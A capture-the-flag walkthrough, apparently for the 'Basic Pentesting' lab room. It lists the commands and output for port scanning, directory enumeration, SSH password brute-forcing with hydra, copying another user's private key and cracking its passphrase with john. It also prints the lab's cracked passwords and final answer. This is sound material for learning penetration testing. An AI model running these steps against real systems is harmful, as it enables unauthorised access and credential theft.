#	Basic Pentesting


##	Scanning Port

	nmap -sC -sV -A 10.10.4.27

	Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-07 20:16 WIB
	Nmap scan report for 10.10.4.27
	Host is up (0.49s latency).
	Not shown: 996 closed ports
	PORT     STATE SERVICE     VERSION
	22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
	|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
	|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
	139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
	8009/tcp open  ajp13?
	|_ajp-methods: Failed to get a valid response for the OPTION request
	Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

	Host script results:
	|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
	|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
	| smb-os-discovery: 
	|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
	|   Computer name: basic2
	|   NetBIOS computer name: BASIC2\x00
	|   Domain name: \x00
	|   FQDN: basic2
	|_  System time: 2021-07-07T09:20:59-04:00
	| smb-security-mode: 
	|   account_used: guest
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)
	| smb2-security-mode: 
	|   2.02: 
	|_    Message signing enabled but not required
	| smb2-time: 
	|   date: 2021-07-07T13:20:59
	|_  start_date: N/A

	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 266.78 seconds


##	Scanning Hidden Directory on website

	gobuster dir -u http://10.10.4.27/ -w /usr/share/dirb/wordlists/common.txt

	/development

##	Brutefore Username in IP ADDRESS

	enum4linux -a <IP ADDRESS> > <Output File>.txt

	We got 2 username, 'jan' and 'kay'

##	Bruteforce Password using Username

	hydra -l <Username> -P /home/rehan/Desktop/rockyou.txt ssh://<IP ADDRESS>

	Username	: jan
	Passwrod	: armando

## Connect to Machine using SSH

	ssh <username>@<IP ADDRESS>

	ssh jan@10.10.4.27

## We found another user directory & We got the private key in .ssh directory

	/home/kay/.ssh/id_rsa (copy contents inside this file into another file)

## Decrypt that private key using ssh2john.py

	python /usr/share/john/ssh2john.py id_rsa > <Output file>

	python /usr/share/john/ssh2john.py id_rsa > hash

## Decrypt the hash file using john the ripper

	john hash --wordlist=/home/rehan/Desktop/rockyou.txt

	Result:
		id_rsa:beeswax

		1 password hash cracked, 0 left

## Connect to Machine using private key and kay username

	ssh -i id_rsa kay@<IP ADDRESS>

	ssh -i id_rsa kay@10.10.4.27

## Print the pass.bak file using cat to answer the last task

	cat pass.bak

	heresareallystrongpasswordthatfollowsthepasswordpolicy$$
